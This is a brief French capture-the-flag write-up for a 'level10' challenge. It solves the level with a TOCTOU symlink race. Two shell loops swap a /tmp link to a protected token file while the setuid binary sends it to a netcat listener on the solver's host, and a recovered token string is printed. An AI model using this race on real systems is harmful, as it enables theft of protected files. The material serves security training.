# LEVEL 10


```
strings level10

...
Connecting to %s:6969 ..
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file ..
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
;*2$"
...
```

On comprend qu'il y'a 
- Une connexion au serveur sur le port 6969
- Une verification de droit utilisateur sur le fichierdans le serveur puis envoie de fichier

Ce qu'on peut faire c'est profiter du moment entre la vérification de droit et l'envoie pour modifier le fichier envoyé

Donc on va lancer une boucle qui crée un lien dans /tmp et qui modifie le lien crée par un lien du token dans /tmp
et une deuxieme boucle qui execute level10 avec le lien crée dans le tmp

On lance en paralléle les deux bouole
```
while true; do ln -fs level10 /tmp/test; ln -fs token /tmp/test; done

while true; do ./level10 /tmp/test 192.168.1.16; done
```

et on va lancer une netcat loop
```
nc -lk 6969
```
-k : Forces nc to stay listening for another connection after its current connection is completed. It is an error to use this option without the -l option.
-l : listen mode, for inbound connects

On trouve:
```
...
woupa2yuojeeaaed06riuj63c
...
```

et avec su flag10 getflag on aura le flag du level10
